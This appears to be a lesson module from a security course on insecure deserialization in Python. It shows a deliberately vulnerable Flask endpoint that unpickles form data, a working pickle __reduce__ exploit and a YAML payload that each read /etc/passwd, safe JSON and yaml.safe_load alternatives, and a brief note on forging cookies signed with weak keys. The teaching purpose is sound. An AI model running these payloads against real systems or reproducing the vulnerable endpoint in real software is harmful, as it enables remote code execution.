Module 21 — Insecure Deserialization

Understand how untrusted serialized data can lead to remote code execution through Python pickle, YAML, and custom object injection.

What Is Deserialization?

Serialization converts objects to a transportable format (bytes, strings). Deserialization reverses this. When an application deserializes untrusted data using unsafe formats like Python's pickle or yaml.unsafe_load(), attackers can inject malicious objects that execute arbitrary code during the deserialization process.

Python Pickle — The Classic RCE

Python's pickle module can serialize/deserialize arbitrary objects. The __reduce__ method controls how an object is reconstructed — and it can call any function:

Vulnerable Code

import pickle, base64

@app.route('/load', methods=['POST'])
def load_data():
    data = request.form.get('data')
    # DANGEROUS: deserializes untrusted data
    obj = pickle.loads(base64.b64decode(data))
    return str(obj)

Exploit Payload

import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.popen, ('cat /etc/passwd',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)  # Send this to the vulnerable endpoint

Safe Alternative

import json

@app.route('/load', methods=['POST'])
def load_data():
    data = request.form.get('data')
    # SAFE: JSON cannot execute code during parsing
    obj = json.loads(data)
    return str(obj)

YAML Deserialization

# DANGEROUS: yaml.unsafe_load() / yaml.load(data, Loader=yaml.UnsafeLoader)
import yaml
data = yaml.unsafe_load(user_input)
# Payload: !!python/object/apply:os.popen ['cat /etc/passwd']

# SAFE: yaml.safe_load() only allows basic types
data = yaml.safe_load(user_input)

Cookie Forgery

Applications that store serialized data in cookies with weak HMAC keys are vulnerable. If the signing key is guessable (e.g., "secret"), attackers can forge cookies with modified data.
